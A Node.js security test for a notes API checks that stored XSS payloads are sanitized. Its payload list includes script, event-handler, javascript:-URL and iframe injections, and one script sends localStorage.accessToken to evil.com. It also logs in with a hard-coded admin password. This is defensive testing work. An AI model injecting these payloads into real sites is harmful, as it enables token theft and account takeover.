/**
 * H07 SECURITY TEST - XSS Sanitization for Notes
 * 
 * Tests that malicious scripts in note content are SANITIZED
 * to prevent stored XSS attacks via shared notes.
 * 
 * RISK: Script execution in shared note → Token theft, Account takeover
 * FIX: DOMPurify sanitization in noteService.createNote/updateNote
 */

const http = require('http');

const API_URL = 'http://localhost:5029';

let authToken = null;
let authCookies = '';
let testNoteId = null;

const testUser = { email: 'admin@aiku.com', password: 'admin123' };

function log(level, message, data = null) {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [${level}] ${message}`);
    if (data) console.log(`    ${typeof data === 'object' ? JSON.stringify(data, null, 2) : data}`);
}

// HTTP request helper
function request(method, path, body = null) {
    return new Promise((resolve, reject) => {
        const url = new URL(path, API_URL);
        const options = {
            hostname: url.hostname,
            port: url.port,
            path: url.pathname + url.search,
            method,
            headers: {
                'Content-Type': 'application/json',
                'Cookie': authCookies
            }
        };
        if (authToken) options.headers['Authorization'] = `Bearer ${authToken}`;

        const req = http.request(options, (res) => {
            let data = '';
            // Capture cookies
            const cookies = res.headers['set-cookie'];
            if (cookies) {
                authCookies = cookies.map(c => c.split(';')[0]).join('; ');
            }
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({
                status: res.statusCode,
                body: data ? JSON.parse(data) : null
            }));
        });
        req.on('error', reject);
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
}

// XSS payloads to test
const xssPayloads = [
    {
        name: 'Script tag',
        input: '<script>alert("XSS")</script>',
        expected: '', // Script should be completely removed
        dangerous: true
    },
    {
        name: 'Script with token theft',
        input: '<script>fetch("https://evil.com?t="+localStorage.accessToken)</script>',
        expected: '',
        dangerous: true
    },
    {
        name: 'IMG onerror',
        input: '<img src="x" onerror="alert(\'XSS\')">',
        expected: '<img src="x">', // onerror attribute removed
        dangerous: true
    },
    {
        name: 'SVG onload',
        input: '<svg onload="alert(\'XSS\')"><circle r="50"></circle></svg>',
        expected: '', // SVG with event handlers removed
        dangerous: true
    },
    {
        name: 'JavaScript URL',
        input: '<a href="javascript:alert(\'XSS\')">Click me</a>',
        expected: '<a href="#">Click me</a>', // javascript: URL neutralized
        dangerous: true
    },
    {
        name: 'Event handler attribute',
        input: '<div onclick="alert(\'XSS\')">Click me</div>',
        expected: '<div>Click me</div>', // onclick removed
        dangerous: true
    },
    {
        name: 'Iframe',
        input: '<iframe src="https://evil.com"></iframe>',
        expected: '', // iframe completely removed
        dangerous: true
    },
    {
        name: 'Style with expression',
        input: '<div style="background:url(javascript:alert())">test</div>',
        expected: '<div>test</div>', // dangerous style removed
        dangerous: true
    },
    {
        name: 'Data URI script',
        input: '<a href="data:text/html,<script>alert(1)</script>">Click</a>',
        expected: '<a href="#">Click</a>',
        dangerous: true
    },
    {
        name: 'Safe paragraph (should preserve)',
        input: '<p>This is safe text</p>',
        expected: '<p>This is safe text</p>',
        dangerous: false
    },
    {
        name: 'Bold and italic (should preserve)',
        input: '<p><strong>Bold</strong> and <em>italic</em></p>',
        expected: '<p><strong>Bold</strong> and <em>italic</em></p>',
        dangerous: false
    },
    {
        name: 'Safe link (should preserve)',
        input: '<a href="https://example.com">Safe link</a>',
        expected: '<a href="https://example.com">Safe link</a>',
        dangerous: false
    },
    {
        name: 'Heading (should preserve)',
        input: '<h1>Title</h1><h2>Subtitle</h2>',
        expected: '<h1>Title</h1><h2>Subtitle</h2>',
        dangerous: false
    },
    {
        name: 'List (should preserve)',
        input: '<ul><li>Item 1</li><li>Item 2</li></ul>',
        expected: '<ul><li>Item 1</li><li>Item 2</li></ul>',
        dangerous: false
    }
];

async function runTests() {
    console.log('='.repeat(70));
    console.log('H07 SECURITY TEST: XSS Sanitization for Notes');
    console.log('='.repeat(70));
    console.log('');

    const results = [];

    try {
        // LOGIN
        log('INFO', 'Logging in...');
        const loginRes = await request('POST', '/api/auth/login', testUser);
        if (loginRes.status !== 200) {
            throw new Error(`Login failed: ${loginRes.body?.message}`);
        }
        authToken = loginRes.body.data.accessToken;
        log('SUCCESS', `Logged in as ${testUser.email}`);

        // TEST EACH PAYLOAD
        console.log('\n' + '='.repeat(70));
        log('TEST', 'Testing XSS Payloads');
        console.log('-'.repeat(70));

        for (let i = 0; i < xssPayloads.length; i++) {
            const payload = xssPayloads[i];
            console.log(`\n--- Test ${i + 1}: ${payload.name} ---`);

            // Create note with XSS payload
            const createRes = await request('POST', '/api/notes', {
                title: `XSS Test ${i + 1}`,
                content: payload.input,
                tags: []
            });

            if (createRes.status !== 201) {
                log('ERROR', `Failed to create note: ${createRes.body?.message}`);
                results.push({ ...payload, status: 'ERROR', actual: null });
                continue;
            }

            const noteId = createRes.body.data.id;
            const savedContent = createRes.body.data.content;

            // Check if dangerous content was sanitized
            const containsScript = savedContent.includes('<script');
            const containsOnerror = savedContent.includes('onerror=');
            const containsOnclick = savedContent.includes('onclick=');
            const containsOnload = savedContent.includes('onload=');
            const containsJavascript = savedContent.includes('javascript:');
            const containsIframe = savedContent.includes('<iframe');

            const isDangerous = containsScript || containsOnerror || containsOnclick ||
                containsOnload || containsJavascript || containsIframe;

            if (payload.dangerous && isDangerous) {
                log('FAIL', `❌ DANGEROUS CONTENT NOT SANITIZED!`);
                log('INFO', `Input:  ${payload.input}`);
                log('INFO', `Output: ${savedContent}`);
                results.push({ ...payload, status: 'FAIL', actual: savedContent });
            } else if (payload.dangerous && !isDangerous) {
                log('PASS', `✅ Dangerous content SANITIZED`);
                log('INFO', `Input:  ${payload.input.substring(0, 50)}...`);
                log('INFO', `Output: ${savedContent.substring(0, 50) || '(empty)'}`);
                results.push({ ...payload, status: 'PASS', actual: savedContent });
            } else if (!payload.dangerous) {
                // Safe content should be preserved
                const preserved = savedContent.includes(payload.input.replace(/<[^>]+>/g, '').substring(0, 10));
                if (preserved) {
                    log('PASS', `✅ Safe content preserved`);
                    results.push({ ...payload, status: 'PASS', actual: savedContent });
                } else {
                    log('WARN', `⚠️ Safe content may have been modified`);
                    log('INFO', `Expected: ${payload.expected}`);
                    log('INFO', `Actual: ${savedContent}`);
                    results.push({ ...payload, status: 'WARN', actual: savedContent });
                }
            }

            // Cleanup: delete test note
            await request('DELETE', `/api/notes/${noteId}`);
        }

        // SUMMARY
        console.log('\n' + '='.repeat(70));
        console.log('TEST RESULTS SUMMARY');
        console.log('='.repeat(70));

        console.log('\n| # | Test                        | Dangerous | Status   |');
        console.log('|---|-----------------------------|-----------| ---------|');
        results.forEach((r, i) => {
            const status = r.status === 'PASS' ? '✅ PASS' :
                r.status === 'FAIL' ? '❌ FAIL' :
                    r.status === 'WARN' ? '⚠️ WARN' : '❓ ERROR';
            const dangerous = r.dangerous ? 'YES' : 'NO';
            console.log(`| ${(i + 1).toString().padEnd(1)} | ${r.name.padEnd(27)} | ${dangerous.padEnd(9)} | ${status} |`);
        });

        const passed = results.filter(r => r.status === 'PASS').length;
        const failed = results.filter(r => r.status === 'FAIL').length;
        const dangerousPassed = results.filter(r => r.dangerous && r.status === 'PASS').length;
        const dangerousTotal = results.filter(r => r.dangerous).length;

        console.log('\n' + '='.repeat(70));
        console.log(`Dangerous payloads sanitized: ${dangerousPassed}/${dangerousTotal}`);
        console.log('='.repeat(70));

        if (failed === 0 && dangerousPassed === dangerousTotal) {
            console.log('✅ H07 FIX VERIFIED: XSS payloads are properly sanitized');
        } else {
            console.log('❌ H07 FIX INCOMPLETE: Some XSS payloads were NOT sanitized!');
        }

        return { passed, failed, dangerousPassed, dangerousTotal, results };

    } catch (error) {
        log('ERROR', 'Test failed', error.message);
        throw error;
    }
}

runTests()
    .then(results => {
        console.log('\nTest completed.');
        process.exit(results.failed > 0 ? 1 : 0);
    })
    .catch(err => {
        console.error('Test error:', err.message);
        process.exit(1);
    });
